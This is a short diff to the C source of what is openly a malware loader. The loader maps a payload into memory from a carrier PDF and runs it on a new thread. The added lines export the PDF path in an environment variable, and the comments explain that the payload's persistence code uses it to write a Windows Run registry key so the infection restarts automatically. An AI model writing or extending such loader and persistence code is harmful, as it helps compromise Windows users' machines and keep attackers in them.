@@ -781,6 +781,24 @@ int main(int argc, char **argv)
     if (!mapped)
         return 4;
 
+    /* Tell the payload where the document came from.
+     *
+     * The payload is mapped IN MEMORY, so GetModuleFileName returns
+     * the LOADER's path -- it has no image of its own. Anything that
+     * needs to name the payload's origin has to be told, and the loader
+     * is the only thing that knows.
+     *
+     * The persistence code uses it to write a Run key that reproduces
+     * the session: the loader, with the document as its argument. */
+    {
+        const char *pdfArg = (argc > 1) ? argv[1] : "";
+        if (pdfArg && pdfArg[0]) {
+            SetEnvironmentVariableA("PX_CARRIER_PDF", pdfArg);
+        } else {
+            SetEnvironmentVariableA("PX_CARRIER_PDF", NULL);
+        }
+    }
+
     th = CreateThread(NULL, 0, run_entry, entry, 0, NULL);
     if (!th) {
         px_log("[loader] CreateThread failed (%lu)\n",
